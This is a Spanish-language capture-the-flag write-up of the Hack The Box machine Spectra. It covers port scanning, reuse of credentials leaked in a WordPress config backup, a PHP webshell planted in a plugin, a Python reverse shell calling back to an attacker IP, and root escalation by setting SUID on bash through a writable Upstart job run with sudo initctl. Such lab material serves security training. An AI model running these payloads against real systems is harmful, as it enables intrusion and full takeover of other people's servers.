---
category: Hack The Box
tags:
  - eJPT
  - eWPT
title: Machine Spectra
comments: "true"
image: /assets/img/machines/Spectra/Spectrabanner.jpeg
---
## Introducción
En este writeup se detalla el proceso completo de explotación de la máquina Spectra de Hack The Box, que combina la identificación y explotación de vulnerabilidades en un entorno WordPress con técnicas clásicas de escalada de privilegios en Linux. Durante el análisis se realiza una enumeración exhaustiva de servicios, se descubre información sensible expuesta, se obtiene acceso remoto mediante una webshell y reverse shell, y finalmente se logra la escalada a root aprovechando configuraciones indebidas en servicios de arranque y permisos especiales. Este writeup documenta paso a paso cómo se logró comprometer completamente el sistema.

## Skills
- Web Enumeration
- wp-config.php
- Python reverse shell
- Abusing Sudoers Privilege
- wordpress plugin

### Enumeración
Como primer paso, se realizó un escaneo de puertos completo, lo que permitió identificar tres puertos abiertos en la máquina: el puerto 22 (SSH), 80 (HTTP) y 3306 (MySQL). La presencia de un servidor web y una base de datos expuesta sugiere que podría tratarse de una aplicación web con posible acceso al backend, lo cual se investigará en las siguientes etapas de la explotación.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.229
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Scanning 10.10.10.229 [65535 ports]
Discovered open port 80/tcp on 10.10.10.229
Discovered open port 3306/tcp on 10.10.10.229
Discovered open port 22/tcp on 10.10.10.229
Completed SYN Stealth Scan at 15:48, 14.81s elapsed (65535 total ports)
Nmap scan report for 10.10.10.229
Host is up, received user-set (0.18s latency).
Not shown: 65506 closed tcp ports (reset), 26 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
           Raw packets sent: 72633 (3.196MB) | Rcvd: 71574 (2.863MB)
```

### Enumeración WEB

Se utilizó la herramienta WhatWeb para identificar tecnologías utilizadas en el servidor web. La respuesta reveló que el sitio está siendo servido por nginx versión 1.17.4, sin mostrar información adicional sobre frameworks o CMS visibles desde la página principal. Esto sugiere una posible configuración personalizada o contenido limitado expuesto públicamente.
```bash
❯ whatweb 10.10.10.229
http://10.10.10.229 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.17.4], IP[10.10.10.229], nginx[1.17.4]
```

Al acceder al sitio web por el puerto 80, se mostró una interfaz sencilla titulada "Issue Tracking", con un mensaje indicando que se utilizará esa página temporalmente hasta que se configure Jira. La interfaz incluye botones etiquetados como "Software Issue Tracker" y "Test", los cuales redirigen al dominio spectra.htb. 
![1](/assets/img/machines/Spectra/1.jpeg)

Esto sugiere que el servidor está utilizando Virtual Hosts y que spectra.htb corresponde al nombre real del host, por lo que será necesario agregarlo manualmente al archivo /etc/hosts para continuar con la exploración.
![2](/assets/img/machines/Spectra/2.jpeg)

Para poder acceder correctamente al dominio identificado, se añadió la entrada spectra.htb al archivo /etc/hosts, apuntando al IP de la máquina. Esto permite que las solicitudes al dominio se resuelvan localmente y se pueda continuar con la enumeración web sobre el Virtual Host configurado en el servidor.
```bash
❯ echo "10.10.10.229 spectra.htb" >> /etc/hosts
```

Utilizando nuevamente WhatWeb, esta vez sobre la ruta /main, se identificó que el servidor redirige a http://spectra.htb/main/, donde se carga un sitio web construido con WordPress versión 5.4.2, ejecutándose sobre PHP 5.6.40 y servido por nginx 1.17.4. La presencia de un WordPress desactualizado sugiere posibles vectores de ataque conocidos que podrían ser aprovechados en fases posteriores de la explotación.
```bash
❯ whatweb http://spectra.htb/main
http://spectra.htb/main [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.17.4], IP[10.10.10.229], RedirectLocation[http://spectra.htb/main/], Title[301 Moved Permanently], nginx[1.17.4]
http://spectra.htb/main/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.17.4], IP[10.10.10.229], MetaGenerator[WordPress 5.4.2], PHP[5.6.40], PoweredBy[-wordpress,-wordpress,,WordPress], Script, Title[Software Issue Management &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.4.2], X-Powered-By[PHP/5.6.40], nginx[1.17.4]
```

Al acceder a la interfaz web en http://spectra.htb/main/, se mostró un sitio WordPress con una entrada publicada. El autor del post aparece listado como Administrator, lo que indica la existencia de un usuario con privilegios elevados en el sistema WordPress. Esta información puede resultar útil para ataques de enumeración de usuarios o fuerza bruta en etapas posteriores.
![3](/assets/img/machines/Spectra/3.jpeg)

```bash
❯ gobuster dir -u http://spectra.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spectra.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/main                 (Status: 301) [Size: 169] [--> http://spectra.htb/main/]
/testing              (Status: 301) [Size: 169] [--> http://spectra.htb/testing/]
```

### wp-config.php
Durante la exploración del sitio, se accedió a la ruta http://spectra.htb/testing/, la cual expone varios archivos del entorno de WordPress. Entre ellos destaca uno llamado wp-config.php.save, una copia de respaldo del archivo de configuración principal de WordPress. Este tipo de archivos puede contener información sensible, como credenciales de base de datos, claves secretas y rutas internas, representando una vulnerabilidad crítica si es accesible públicamente.
![4](/assets/img/machines/Spectra/4.jpeg)

Accediendo directamente al archivo http://spectra.htb/testing/wp-config.php.save, se pudo visualizar el contenido completo del archivo de configuración de WordPress. 
![5](/assets/img/machines/Spectra/5.jpeg)

En él se encontraron las credenciales de acceso a la base de datos MySQL, específicamente el usuario devtest y la contraseña devteam01.
```plaintext
'DB_USER', 'devtest'
'DB_PASSWORD', 'devteam01'
```

Con las credenciales extraídas del archivo wp-config.php.save, se intentó iniciar sesión en el panel de administración de WordPress (http://spectra.htb/main/wp-login.php) utilizando el usuario devtest y la contraseña devteam01. 
![6](/assets/img/machines/Spectra/6.jpeg)

El acceso fue exitoso, lo que confirmó que las credenciales también eran válidas para el entorno web y permitió obtener control sobre el backend de WordPress. solo apretando en Remind me later.
![7](/assets/img/machines/Spectra/7.jpeg)

## wordpress plugin
Desde el panel de administración de WordPress, se accedió al editor de plugins y se modificó uno de los archivos PHP agregando la siguiente línea:
```php
system($_GET['cmd']);
```
Esta instrucción permite ejecutar comandos del sistema directamente desde el navegador mediante el parámetro cmd, creando así una webshell básica que brinda control remoto sobre el servidor a través de peticiones HTTP.
![8](/assets/img/machines/Spectra/8.jpeg)

Tras modificar el plugin con la línea maliciosa, se accedió directamente al archivo modificado mediante la URL:
```plaintext
http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=ls -l
```
Esto permitió ejecutar el comando ls -l en el servidor y visualizar el listado de archivos en el directorio actual, confirmando que la webshell está funcionando correctamente y que se tiene capacidad de ejecutar comandos arbitrarios en el sistema.
![9](/assets/img/machines/Spectra/9.jpeg)

## Python reverse shell
Para obtener una reverse shell más cómoda, se utilizó la webshell previamente implantada para ejecutar un payload en Python que establece una conexión inversa hacia la máquina atacante. El comando fue enviado mediante la URL:
```plaintext
http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```


Mientras se enviaba el payload de la reverse shell, en la máquina atacante deje un listener activo. Tras ejecutar el comando, se estableció exitosamente una conexión, proporcionando acceso a una shell remota y confirmando el compromiso del servidor a través del vector web.
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.229] 35734
$ 
```

Una vez establecida la reverse shell, se comenzó a explorar el sistema. Al navegar hacia el directorio /home, se encontraron varios usuarios configurados en la máquina: chronos, katie, nginx, root y user. Esto sugiere que podrían existir múltiples objetivos potenciales para escalada de privilegios o extracción de información sensible.
```bash
nginx@spectra /opt $ cd /home
nginx@spectra /home $ ls
chronos  katie	nginx  root  user
```

urante la exploración del directorio /opt, se identificó un archivo interesante llamado autologin.conf.orig. Al revisar su contenido, se observó un script utilizado por Chromium OS para realizar inicio de sesión automático en el arranque del sistema. El script indica que lee la contraseña desde un archivo ubicado en /mnt/stateful_partition/etc/autologin/passwd o /etc/autologin/passwd, y luego la inyecta en el prompt de inicio de sesión. Esta información sugiere la posibilidad de que exista una contraseña almacenada en texto claro en alguno de estos directorios, lo que podría facilitar la obtención de credenciales de usuarios con mayores privilegios.
```bash
nginx@spectra ~ $ cd /opt
nginx@spectra /opt $ ls -l
total 36
drwxr-xr-x 2 root root 4096 Jun 28  2020 VirtualBox
-rw-r--r-- 1 root root  978 Feb  3  2021 autologin.conf.orig
drwxr-xr-x 2 root root 4096 Jan 15  2021 broadcom
drwxr-xr-x 2 root root 4096 Jan 15  2021 displaylink
drwxr-xr-x 2 root root 4096 Jan 15  2021 eeti
drwxr-xr-x 5 root root 4096 Jan 15  2021 google
drwxr-xr-x 6 root root 4096 Feb  2  2021 neverware
drwxr-xr-x 5 root root 4096 Jan 15  2021 tpm1
drwxr-xr-x 5 root root 4096 Jan 15  2021 tpm2
nginx@spectra /opt $ cat autologin.conf.orig 
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
```

Siguiendo la ruta indicada en el archivo autologin.conf.orig, se verificó la existencia del archivo /etc/autologin/passwd, el cual efectivamente estaba presente. Al leer su contenido, se encontró la contraseña SummerHereWeCome!! almacenada en texto claro. Este hallazgo es crítico, ya que puede ser utilizado para intentar el acceso con otros usuarios del sistema y escalar privilegios.
```bash
nginx@spectra /opt $ ls /etc/autologin
passwd
nginx@spectra /opt $ cat /etc/autologin/passwd
SummerHereWeCome!!
```

Con la contraseña SummerHereWeCome!! encontrada en el archivo de autologin, se intentó establecer una conexión SSH con el usuario katie, uno de los usuarios listados previamente en el sistema. El acceso fue exitoso, otorgando una shell interactiva bajo el usuario katie.
```bash
❯ ssh katie@10.10.10.229
(katie@10.10.10.229) Password: SummerHereWeCome!! 
katie@spectra ~ $ 
```

### Captura flag usuario
Una vez dentro del sistema como el usuario katie, se obtuvo la flag de usuario, confirmando el acceso exitoso y consolidando el control sobre una cuenta con permisos de usuario regular en la máquina.
```bash
katie@spectra ~ $ ls
log  user.txt
katie@spectra ~ $ cat user.txt                                                                                                                              
e89d27fe195e9114ffa72ba8913a6130
```

## Abusing Sudoers Privilege
Mientras se investigaban posibles vectores de escalada de privilegios, se ejecutó un comando para buscar archivos pertenecientes al grupo developers, revelando múltiples archivos en /etc/init/ con permisos de escritura para dicho grupo, así como un archivo ejecutable en /srv/ llamado nodetest.js. Al revisar los privilegios del usuario katie con sudo -l, se descubrió que puede ejecutar el comando /sbin/initctl con sudo sin necesidad de contraseña. Esto es relevante porque initctl permite gestionar servicios basados en Upstart, por lo que se podría aprovechar para cargar uno de los archivos .conf con código malicioso y lograr una ejecución como root.

```bash
katie@spectra ~ $ cd log
katie@spectra ~/log $ ls -l
total 0
katie@spectra ~/log $ find / -group developers 2>/dev/null | xargs ls -l
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test1.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test10.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test2.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test3.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test4.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test5.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test6.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test7.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test8.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test9.conf
-rwxrwxr-x 1 root developers  251 Jun 29  2020 /srv/nodetest.js

/srv:
total 4
-rwxrwxr-x 1 root developers 251 Jun 29  2020 nodetest.js
katie@spectra ~/log $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
katie@spectra ~/log $ ls -l /bin/bash
-rwxr-xr-x 1 root root 551984 Dec 22  2020 /bin/bash
```

Aprovechando los permisos de escritura sobre los archivos de configuración de servicios en /etc/init/ y el permiso para ejecutar /sbin/initctl con sudo, se editó el archivo test1.conf para añadir la línea:
```bash
exec chmod u+s /bin/bash
```

Luego de modificar el archivo de configuración, se inició el servicio con permisos de root. Esto ejecutó la línea maliciosa añadida, aplicando el bit SUID sobre /bin/bash. La verificación posterior mostró que el intérprete ahora tiene permisos elevados (-rwsr-xr-x), lo que permite ejecutar una shell con privilegios de root.
```bash
katie@spectra ~/log $ nano /etc/init/test1.conf

katie@spectra ~/log $ sudo -u root /sbin/initctl start test1
test1 start/running, process 30826
katie@spectra ~/log $ ls -l /bin/bash
-rwsr-xr-x 1 root root 551984 Dec 22  2020 /bin/bash
```

### Captura flag root
Finalmente, ejecutando /bin/bash con el bit SUID habilitado (bash -p), se obtuvo una shell con privilegios root. Desde esta sesión, se accedió al directorio /root y se leyó el archivo root.txt, obteniendo la flag final que confirma la completa explotación y control de la máquina.
```bash
katie@spectra ~/log $ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# ls
main  nodetest.js  root.txt  script.sh	startup  test.conf
bash-4.3# cat root.txt 
d44519713b889d5e1f9e536d0c6df2fc
bash-4.3# 
```